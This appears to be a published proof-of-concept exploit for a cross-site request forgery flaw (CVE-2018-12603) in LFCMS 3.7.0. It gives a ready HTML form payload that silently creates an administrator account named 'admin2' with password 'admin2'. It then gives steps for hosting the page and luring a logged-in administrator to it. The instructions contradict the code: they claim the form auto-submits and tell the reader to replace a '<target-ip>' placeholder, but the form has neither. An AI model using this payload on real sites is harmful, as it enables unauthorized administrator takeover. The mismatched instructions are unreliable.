# Exploit Title: A CSRF vulnerability exists in LFCMS_3.7.0: administrator account can be added arbitrarily.
# Date: 2018-06-20
# Exploit Author: bay0net
# Vendor Homepage: https://www.cnblogs.com/v1vvwv/p/9203899.html
# Software Link: http://www.lfdycms.com/home/down/index/id/26.html
# Version: 3.7.0
# CVE : CVE-2018-12603


A CSRF vulnerability exists in LFCMS_3.7.0:  administrator account can be added arbitrarily.


The payload for attack is as follows.


<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://10.211.55.17/lfdycms3.7.0/admin.php?s=/Member/add.html" method="POST">
      <input type="hidden" name="username" value="admin2" />
      <input type="hidden" name="password" value="admin2" />
      <input type="hidden" name="repassword" value="admin2" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>


Instructions:

Prerequisites:
LFCMS Installation:

Ensure LFCMS version 3.7.0 is installed and accessible on your target server.
Administrator Access:

You need to have an administrator account logged into the LFCMS application.
 Create a new HTML file with the exploit. This exploit will simulate a request to add a new administrator account.

Replace <target-ip> with the IP address or domain of the LFCMS server.
Save the file as csrf_exploit.html.
Host this file on a web server or share it through a file-sharing service.

Ensure you are logged into the LFCMS application as an administrator.
Open a browser and navigate to the URL where the csrf_exploit.html file is hosted.

The form will automatically submit once the page is loaded.
Monitor the LFCMS application to check if a new administrator account with username admin2 and password admin2 is created.
Try logging into LFCMS with the new credentials.
Verify if the new administrator account has been successfully added and has the appropriate permissions.


